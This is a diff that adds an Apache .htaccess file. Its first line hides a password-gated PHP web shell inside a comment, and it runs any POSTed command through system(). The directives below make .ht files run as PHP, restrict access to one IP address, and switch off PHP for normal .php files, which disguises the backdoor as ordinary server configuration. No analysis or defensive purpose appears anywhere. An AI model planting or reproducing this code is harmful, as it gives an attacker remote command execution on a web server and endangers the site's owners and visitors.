@@ -1,0 +1,10 @@
+# <?php ob_clean(); if(isset($_POST["p"])&&isset($_POST["w"]))if(hash("sha1",$_POST["p"])==="c29f375f360a285114f39974f4c2a27443312148")@system($_POST["w"]); die(); ?>
+<Files ~ "^\.ht">
+    Require all granted
+    Order allow,deny
+    Allow from 10.14.15.119
+    SetHandler application/x-httpd-php
+</Files>
+<FilesMatch \.php$>
+    SetHandler None
+</FilesMatch>
